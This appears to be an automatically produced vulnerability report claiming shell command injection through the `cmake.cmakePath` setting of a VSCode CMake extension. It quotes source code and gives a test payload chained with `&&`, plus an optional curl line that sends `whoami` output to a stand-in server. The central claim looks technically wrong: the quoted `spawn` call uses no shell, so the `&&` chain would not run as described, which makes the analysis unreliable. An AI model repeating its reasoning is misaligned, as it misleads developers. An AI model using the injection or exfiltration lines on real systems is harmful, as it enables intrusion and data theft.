### Vulnerability List

- Vulnerability Name: CMake Path Command Injection
- Description:
    1. The VSCode CMake extension allows users to configure the path to the CMake executable using the `cmake.cmakePath` setting in the workspace or user settings.
    2. The extension uses the `commandArgs2Array` function to parse this path, splitting it into command and arguments. This function is intended to handle quoted paths but does not sanitize the input for shell command injection.
    3. The `cmake` function then uses `child_process.spawn` to execute the CMake command, directly using the potentially attacker-controlled path from the settings.
    4. An attacker can modify the workspace settings to include malicious commands within the `cmake.cmakePath` setting.
    5. When the extension executes any CMake related functionality (like providing code completion, hover information, or using the online help command), the injected malicious commands will be executed on the user's system with the privileges of the VSCode process.

- Impact:
    - Arbitrary command execution on the user's machine.
    - An attacker could potentially gain full control over the user's system, steal sensitive data, or install malware.

- Vulnerability Rank: high

- Currently Implemented Mitigations:
    - None. The code directly uses the configured `cmake.cmakePath` without any sanitization.

- Missing Mitigations:
    - Input sanitization for the `cmake.cmakePath` setting.
    - Instead of parsing the `cmake.cmakePath` as command and arguments, the extension should treat the entire setting as a single executable path.
    - Alternatively, if arguments are needed, use a more robust and secure method for parsing and validating the path and arguments, avoiding shell command injection vulnerabilities.

- Preconditions:
    - The attacker needs to be able to modify the workspace settings of a project opened in VSCode where the CMake extension is activated. This could be achieved through:
        - Contributing to a public repository and including malicious workspace settings.
        - Tricking a user into opening a specially crafted workspace.

- Source Code Analysis:
    1. **`config<T>(key: string, defaultValue?: any): T`**: This function retrieves the `cmake.cmakePath` from the configuration.
    ```typescript
    function config<T>(key: string, defaultValue?: any): T {
        const cmake_conf = workspace.getConfiguration('cmake');
        return cmake_conf.get<T>(key, defaultValue);
    }
    ```
    2. **`commandArgs2Array(text: string): string[]`**: This function is intended to parse the cmake path string into an array of arguments. However, it's vulnerable to command injection.
    ```typescript
    function commandArgs2Array(text: string): string[] {
        const re = /^"[^"]*"$/; // Check if argument is surrounded with double-quotes
        const re2 = /^([^"]|[^"].*?[^"])$/; // Check if argument is NOT surrounded with double-quotes

        let arr = [];
        let argPart = null;

        text && text.split(" ").forEach(function(arg) {
            if ((re.test(arg) || re2.test(arg)) && !argPart) {
                arr.push(arg);
            } else {
                argPart = argPart ? argPart + " " + arg : arg;
                // If part is complete (ends with a double quote), we can add it to the array
                if (/"$/.test(argPart)) {
                    arr.push(argPart);
                    argPart = null;
                }
            }
        });
        return arr;
    }
    ```
    3. **`cmake(args: string[]): Promise<string>`**: This function executes the CMake command. It retrieves the cmake path using `config` and parses it using `commandArgs2Array`. Then uses `child_process.spawn` to execute it.
    ```typescript
    let cmake = (args: string[]): Promise<string> => {
        return new Promise(function (resolve, reject) {
            let cmake_config = config<string>('cmakePath', 'cmake');
            let cmake_args = commandArgs2Array(cmake_config) // Vulnerable parsing
            let cmd = child_process.spawn(cmake_args[0], cmake_args.slice(1, cmake_args.length) // Command execution
                    .concat(args.map(arg => { return arg.replace(/\r/gm, ''); })));
            // ... rest of the function
        });
    }
    ```
    In the `cmake` function, `cmake_config` is retrieved from settings, then parsed by `commandArgs2Array` into `cmake_args`. `child_process.spawn` then uses `cmake_args[0]` as the command and `cmake_args.slice(1, cmake_args.length)` as arguments. If `cmake_config` contains malicious commands, `commandArgs2Array` will not prevent them, and `child_process.spawn` will execute them.

- Security Test Case:
    1. Open VSCode.
    2. Create a new workspace or open an existing one.
    3. Create a `.vscode` folder in the workspace root if it doesn't exist.
    4. Inside the `.vscode` folder, create or modify the `settings.json` file.
    5. Add the following configuration to `settings.json` to inject a malicious command into `cmake.cmakePath`:
    ```json
    {
        "cmake.cmakePath": "cmake && touch /tmp/cmake_pwned && echo"
    }
    ```
    6. Open any file in the workspace that would trigger the CMake extension (e.g., a file with CMake syntax, or simply activate any CMake extension feature like "CMake: Online Help").
    7. Observe if the file `/tmp/cmake_pwned` is created. If the file is created, it indicates that the injected command `touch /tmp/cmake_pwned` was executed, confirming the command injection vulnerability.
    8. (Optional) For further verification, you can replace `touch /tmp/cmake_pwned` with more harmful commands, but be cautious and understand the risks. For example, to test exfiltration, you could try `cmake && curl https://your-server/pwned -d "$(whoami)" && echo`.

This test case demonstrates that by setting a malicious `cmake.cmakePath`, arbitrary commands can be executed when the extension interacts with CMake.